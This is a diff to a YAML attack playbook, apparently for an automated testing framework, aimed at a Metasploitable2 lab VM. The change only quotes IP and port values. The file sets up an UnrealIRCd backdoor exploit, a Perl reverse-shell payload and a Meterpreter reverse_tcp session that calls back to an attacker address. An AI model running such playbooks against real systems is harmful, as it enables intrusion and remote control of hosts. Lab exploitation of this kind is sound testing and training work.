@@ -13,10 +13,10 @@
 #     3. Target a Metasploitable2-VM
 #
 vars:
-  METASPLOITABLE: 192.168.10.225
-  ATTACKER: 172.17.0.127
+  METASPLOITABLE: "192.168.10.225"
+  ATTACKER: "172.17.0.127"
   PAYLOAD: cmd/unix/reverse_perl
-  LPORT: 4422
+  LPORT: "4422"
 
 commands:
   # Perform Unreal-Irc-Backdoor-Exploit
@@ -44,7 +44,7 @@ commands:
     payload: linux/x86/meterpreter/reverse_tcp
     payload_options:
       LHOST: $ATTACKER
-      LPORT: 4433
+      LPORT: "4433"
 
   # Execute meterpreter-command 'sysinfo'
   - type: msf-session
